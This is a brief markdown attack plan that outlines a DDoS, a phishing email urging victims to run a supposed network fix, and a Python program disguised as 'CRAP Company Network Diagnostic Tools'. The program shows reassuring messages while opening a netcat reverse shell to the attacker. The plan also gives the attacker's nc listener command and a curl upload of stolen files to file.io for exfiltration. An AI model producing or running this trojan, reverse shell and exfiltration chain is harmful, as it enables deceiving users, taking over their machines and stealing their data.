# Attack Flow

1. DDoS
2. Phishing Email (saying something like input this command to fix your slow network!)
3. use NC to gain access
    - Attacker’s computer
    
    ```bash
    sudo nc -lnvp <PORT_NUMBER> -s <THIS_IP_ADDRESS>
    ```
    
    - Victim’s computer executable (use `pyinstaller` to generate the executable file)
    
    ```python
    import subprocess, time
    
    def main():
        
        subprocess.run("echo '***** Welcome to CRAP Company Network Diagnostic Tools *****'", shell=True)
        time.sleep(2)
        subprocess.run("echo 'Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins.'", shell=True)
        subprocess.run("echo 'Reminder: Dont close this window! Your network will be slow again if you do so!'", shell=True)
        
        subprocess.run("nc -e /bin/bash ATTACKERS_IP_ADDRESS PORT_NUMBER", shell=True)
    
    if __name__ == "__main__":
        main()
    ```
    
4. Navigate through the directories, find out the file we want
5. Upload to file.io, jot down the keys, download them all after the attack

```bash
curl -X 'POST' \
  'https://file.io/' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@<FILE_NAME_GOES_HERE>' \
  -F 'expires=2022-09-07' \
  -F 'maxDownloads=1' \
  -F 'autoDelete=true'
```